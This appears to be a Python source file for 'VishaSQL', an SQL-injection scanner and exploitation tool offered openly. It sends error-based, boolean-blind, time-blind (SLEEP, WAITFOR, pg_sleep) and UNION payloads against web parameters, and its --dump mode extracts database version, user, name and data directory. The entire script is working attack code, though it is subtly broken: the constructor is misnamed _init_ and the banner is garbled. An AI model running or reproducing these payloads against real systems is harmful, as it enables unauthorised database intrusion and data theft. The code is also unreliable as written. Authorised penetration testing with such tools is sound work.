#!/usr/bin/env python3
# -- coding: utf-8 --
"""
VishaSQL - Full SQLi Scanner (Error / Boolean-blind / Time-blind / Union + Data dump)
Authorized security testing only. Use strictly within declared scope.
"""
import argparse, re, sys, time, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.exit("[-] Install requests: pip install requests")

BANNER = r"""
   _  _           _     _  __ _ 
  |  \/  |_ _ _  _| |_ / __|/ _| |
  | |\/| / ` | || | / / \_ \  _| |
  ||  |\_,|\, |\\ |_/| |_|
              |__/   Full SQLi Scanner
   error | boolean | time | union | dump
"""
print(BANNER)

# ------------------------------------------------------------------ DB sigs ---
DB_ERRORS = {
 "MySQL":  [r"SQL syntax.*MySQL", r"mysql_", r"MySQLSyntaxError", r"check the manual that corresponds to your MySQL", r"MariaDB"],
 "MSSQL":  [r"OLE DB Provider for SQL", r"Unclosed quotation", r"SQL Server", r"ODBC SQL Server", r"SqlException"],
 "Oracle": [r"ORA-[0-9]{5}", r"Oracle error", r"quoted string not properly terminated"],
 "PostgreSQL":[r"PostgreSQL.*ERROR", r"PG::Error", r"syntax error at or near", r"character with byte sequence"],
 "SQLite": [r"SQLite/JDBC", r"SQLite.Exception", r"System.Data.SQLite"],
}

ERROR_PAYLOADS = ["'", "\"", "''", "' OR '1'='1", "' OR 1=1-- -", "\" OR \"1\"=\"1",
                  "' AND 1=1-- -", "' AND 1=1#", "1' ORDER BY 1-- -", "1')-- -",
                  "' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -"]

BOOL_PAIRS = [("' AND '1'='1", "' AND '1'='2"),
              ("' AND 1=1-- -", "' AND 1=2-- -"),
              ("' OR '1'='1'-- -", "' OR '1'='2'-- -"),
              ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2")]

TIME_PAYLOADS = [("' AND SLEEP(6)-- -", 5), ("' AND (SELECT * FROM (SELECT SLEEP(6))a)-- -", 5),
                 ("'; WAITFOR DELAY '00:00:06'-- -", 5), ("' AND pg_sleep(6)-- -", 5),
                 ("' OR pg_sleep(6)-- -", 5), ("1' AND SLEEP(6)#", 5)]

# ------------------------------------------------------------------ helpers ---
class Target:
    def _init_(s, url, params, cookies, headers, method, timeout, proxy=None):
        s.url, s.params, s.method = url, params, method.upper()
        s.cookies, s.headers, s.timeout = cookies or {}, headers or {}, timeout
        s.session = requests.Session()
        if proxy: s.session.proxies = {"http": proxy, "https": proxy}
    def send(s, overrides, verbose=False):
        data = dict(s.params); data.update(overrides)
        kw = dict(cookies=s.cookies, headers=s.headers, timeout=s.timeout, verify=False)
        try:
            if s.method == "GET":
                r = s.session.get(s.url, params=data, **kw)
            else:
                r = s.session.post(s.url, data=data, **kw)
            return r.text or ""
        except Exception as e:
            return ""

def norm(b): return re.sub(r"\s+", "", b or "")
ERR_RE = re.compile("|".join(r for sigs in DB_ERRORS.values() for r in sigs), re.I)

# ----------------------------------------------------------- detection core ---
def detect_db(body):
    for db, sigs in DB_ERRORS.items():
        if any(re.search(x, body, re.I) for x in sigs): return db
    return None

def test_error(t, p):
    for pl in ERROR_PAYLOADS:
        db = detect_db(t.send({p: pl}))
        if db: return ("error-based", db, pl)
    return None

def test_boolean(t, p):
    for tr, fa in BOOL_PAIRS:
        tb, fb = norm(t.send({p: tr})), norm(t.send({p: fa}))
        if tb and fb and tb != fb: return ("boolean-blind", tr, fa)
    return None

def test_time(t, p):
    for pl, exp in TIME_PAYLOADS:
        st = time.time(); t.send({p: pl}); el = time.time() - st
        if el >= exp: return ("time-blind", pl, exp)
    return None

# --------------------------------------------------------------- union core ---
def is_bad(body):
    if not body or not body.strip(): return True
    return bool(re.search(r"(unknown column|order by|syntax error|ORA-|SQL Server"
                          r"|mysql_|Warning|PG::Error|at or near|SqlException"
                          r"|Invalid object name)", body, re.I))

def find_columns(t, p):
    lo, hi, best = 1, 60, 0
    while lo <= hi:
        mid = (lo + hi) // 2
        if is_bad(t.send({p: f"' ORDER BY {mid}-- -"})): hi = mid - 1
        else: best, lo = mid, mid + 1
    return best

def union_exfil(t, p, ncols, col, expr):
    parts = ["NULL"] * ncols; parts[col] = expr
    body = t.send({p: "' UNION SELECT " + ", ".join(parts) + "-- -"})
    return body

def test_union(t, p):
    ncols = find_columns(t, p)
    if ncols < 1: return None
    out = []
    for i in range(ncols):
        parts = ["NULL"] * ncols; m = f"V5X{i}"
        parts[i] = f"'{m}'"
        if m in t.send({p: "' UNION SELECT " + ", ".join(parts) + "-- -"}):
            out.append(i)
    if not out:
        body = union_exfil(t, p, ncols, 0, "@@version")
        db = detect_db(body) or "unknown"
        return ("union-based", f"{ncols} cols, no visible reflection (db:{db})", None)
    body = union_exfil(t, p, ncols, out[0], "@@version")
    m = re.search(r"\d+(\.\d+)+", body)
    ver = m.group(0) if m else "?"
    return ("union-based", f"{ncols} cols, reflected col {out}", ver)

# ------------------------------------------------------------------ dump -----
def dump_union(t, p, ncols, col, query):
    return union_exfil(t, p, ncols, col, query)

def dump_text(t, p, ncols, col):
    """Extract marker-wrapped text via reflected column."""
    body = union_exfil(t, p, ncols, col, "'V5X'||@@version")
    return body

# -------------------------------------------------------------- scanners ------
def probe_all(t, p):
    for fn in (test_error, test_boolean, test_time, test_union):
        try:
            r = fn(t, p)
            if r: return r
        except Exception:
            continue
    return None

# ------------------------------------------------------------------- main ----
def main():
    ap = argparse.ArgumentParser(description="VishaSQL - full SQLi scanner")
    ap.add_argument("url")
    ap.add_argument("-d", "--data", help="POST body key=val&key=val")
    ap.add_argument("-G", "--get", action="store_true")
    ap.add_argument("-p", "--params", help="params to test, comma sep")
    ap.add_argument("-c", "--cookie")
    ap.add_argument("-H", "--header", action="append")
    ap.add_argument("-t", "--timeout", type=int, default=12)
    ap.add_argument("-T", "--threads", type=int, default=5)
    ap.add_argument("-P", "--proxy", help="http proxy, e.g. http://127.0.0.1:8080")
    ap.add_argument("--dump", action="store_true", help="dump via union once vuln found")
    ap.add_argument("--dump-col", type=int, default=0, help="reflected col index to dump")
    args = ap.parse_args()

    params = dict(urllib.parse.parse_qsl(args.data)) if args.data else {}
    if args.data or args.get:
        method = "POST" if args.data else "GET"
    else:
        method = "GET"
        pr = urllib.parse.urlparse(args.url)
        params.update(dict(urllib.parse.parse_qsl(pr.query)))

    headers = {}
    for h in (args.header or []):
        if ":" in h: k, v = h.split(":", 1); headers[k.strip()] = v.strip()
    cookies = {}
    for c in ((args.cookie or "").split(";")):
        if "=" in c: k, v = c.strip().split("=", 1); cookies[k] = v

    sel = list(params.keys())
    if args.params:
        want = [x.strip() for x in args.params.split(",")]
        sel = [p for p in sel if p in want]
    if not sel: sys.exit("[-] No params to test.")

    t = Target(args.url, params, cookies, headers, method, args.timeout, args.proxy)
    print(f"[*] URL={args.url}  method={method}  params={sel}\n")

    results = {}
    def work(p):
        r = probe_all(t, p)
        return p, r

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(work, p): p for p in sel}
        for f in as_completed(futs):
            p, r = f.result()
            if r: results[p] = r

    if not results:
        print("[+] No SQLi detected on tested params."); return

    print("=" * 62)
    for p, (kind, info, extra) in results.items():
        print(f"[!] param '{p}' -> {kind.upper()}")
        print(f"      {info}")
        if extra: print(f"      detail: {extra}")
    print("=" * 62)

    if args.dump:
        v = results.get(args.params.split(",")[0] if args.params else sel[0])
        if not v: return
        kind = v[0]
        # crude demonstration dump: only works reliably for union+reflection
        if kind == "union-based" and "reflected" in str(v[1]):
            ncols = int(re.search(r"(\d+) cols", str(v[1])).group(1))
            col = int(re.search(r"col \[?(\d+)\]?", str(v[1])).group(1)) if args.dump_col == 0 else args.dump_col
            print("\n[*] Union dump probing @@version / user / database() ...")
            for expr, label in [("@@version", "VERSION"), ("user()", "USER"),
                                ("database()", "DB"), ("@@datadir", "DATADIR")]:
                body = union_exfil(t, args.params.split(",")[0] if args.params else sel[0],
                                   ncols, col, expr)
                txt = re.sub(r"\s+", " ", body).strip()
                print(f"    {label:<8}: {txt[:200]}")
        else:
            print("\n[-] --dump needs a union-based vuln w/ visible reflection.")

if __name__ == "__main__":
    main()
